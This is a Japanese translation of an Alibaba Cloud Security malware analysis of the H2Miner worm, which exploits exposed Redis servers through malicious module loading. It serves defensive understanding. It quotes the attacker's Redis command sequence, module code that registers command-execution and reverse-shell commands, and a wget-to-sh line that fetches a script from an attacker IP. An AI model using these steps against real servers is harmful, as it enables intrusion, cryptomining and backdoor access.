Redis RCEを悪用するH2Minerワームの新たな発生が発見されました

1日前、私のプロジェクトのサーバーの1つが同様のワームに攻撃されました。「何だったの？」という質問への答えを求めて Alibaba Cloud Securityチームのすばらしい記事を見つけました。私はこの記事をHabrで見つけなかったので、特にあなたのために翻訳することにしました<3

前書き


Alibaba Cloudセキュリティチームは最近、H2Minerの突然の発生を発見しました。このタイプの悪意のあるワームは、システムへのゲートウェイとしてRedisの認証の欠如または弱いパスワードを使用します。その後、マスター/スレーブ同期を介して自身の悪意のあるモジュールをスレーブと同期し、最後にこの悪意のあるモジュールをターゲットマシンにダウンロードして、悪意のある命令を実行します。

これまで、システムへの攻撃は主に、攻撃者がRedisにログインした後にマシンに書き込まれたスケジュールされたタスクまたはSSHキーを含む方法を使用して行われていました。幸い、この方法は、アクセス許可の制御に問題があるか、システムのバージョンが異なるため、使用できません。ただし、悪意のあるモジュールをロードするこの方法は、攻撃者のコマンドを直接実行したり、シェルにアクセスしたりする可能性があり、システムにとって危険です。

インターネット上でホストされているRedisサーバーの数が多い（ほぼ100万）ため、Alibaba Cloudセキュリティチームは、ユーザーにネットワークからRedisへのアクセスを提供しないよう推奨し、定期的にパスワードの強度と、それらが公開されているかどうかを確認しますクイックセレクション。

H2マイナー


H2Minerは、Hadoopヤーン、Docker、およびRedisのリモートコマンド実行（RCE）の脆弱性における認証の欠落など、さまざまな方法でシステムに侵入できるLinuxベースのシステム用のマイニングボットネットです。ボットネットは、悪意のあるスクリプトやマルウェアをダウンロードしてデータをマイニングし、攻撃を水平方向に拡大し、コマンドアンドコントロール（C＆C）通信を維持することで機能します。

Redis rce


Pavel Toporkovはこの問題に関する知識をZeroNights 2018で共有しました。バージョン4.0以降、Redisは外部モジュール機能のロードをサポートし、CでコンパイルされたファイルをRedisにダウンロードして特定のRedisコマンドを実行できるようにします。この機能は便利ですが、マスタースレーブモードで、fullresyncモードを介してファイルをスレーブと同期できる脆弱性が含まれています。攻撃者はこれを使用して、悪意のあるファイルを転送することができます。転送が完了すると、攻撃者はモジュールを攻撃されたRedisインスタンスにロードし、コマンドを実行します。

マルウェアワーム分析


最近、Alibaba Cloudセキュリティチームは、悪意のあるH2Minerマイナーのグループのサイズが突然劇的に増加することを発見しました。分析によると、全体的な攻撃プロセスは次のとおりです



。H2MinerはRCE Redisを使用して完全な攻撃を行います。まず、攻撃者は保護されていないRedisサーバーまたは弱いパスワードを持つサーバーを攻撃します。

次に、コマンドconfig set dbfilename red2.soを使用してファイル名を変更します。その後、攻撃者はコマンドslaveofを実行してマスター/スレーブレプリケーションホストアドレスを設定します。

攻撃されたRedisのインスタンスが攻撃者に属する悪意のあるRedisとのマスタースレーブ接続を確立すると、攻撃者はfullresyncコマンドを使用して感染したモジュールを送信し、ファイルを同期します。次に、red2.soファイルが攻撃されたマシンにダウンロードされます。その後、攻撃者は./red2.soダウンロードモジュールを使用して、このsoファイルをダウンロードします。モジュールは、悪意のあるコマンドを実行したり、逆接続（バックドア）を開始して、攻撃されたマシンにアクセスすることができます。

if (RedisModule_CreateCommand(ctx, "system.exec",
        DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;
      if (RedisModule_CreateCommand(ctx, "system.rev",
        RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

/ bin / sh -c wget -q -O-http://195.3.146.118/unk.sh | sh> / dev / null 2> & 1攻撃者 などの悪意のあるコマンドを実行すると、バックアップファイル名がリセットされ、システムモジュールがアンロードされてトレースがクリアされます。ただし、red2.soファイルは攻撃されたマシンに残ります。ユーザーは、Redisインスタンスのフォルダーにそのような疑わしいファイルが存在することに注意することをお勧めします。

攻撃者は、一部の悪意のあるプロセスを破壊してリソースを盗むだけでなく、悪意のあるファイルをバイナリ形式でダウンロードし、142.44.191.122 / kinsingに実行することにより、悪意のあるスクリプトを追跡しました。これは、ホスト上のkinsingを含むプロセス名またはディレクトリ名が、このマシンがこのウイルスに感染していたことを示している可能性があることを意味します。

リバースエンジニアリングの結果によると、悪意のあるプログラムは基本的に次の機能を実行します。

  • ファイルのダウンロードと実行
  • 鉱業
  • C＆C通信の維持と攻撃コマンドの実行



外部スキャンにmasscanを使用して、影響を拡大します。さらに、C＆CサーバーのIPアドレスはプログラムにハードコードされており、攻撃されたホストはHTTPリクエストを使用してC＆C通信サーバーとやり取りします。ゾンビ（ハッキングされたサーバー）情報はHTTPヘッダーで識別されます。
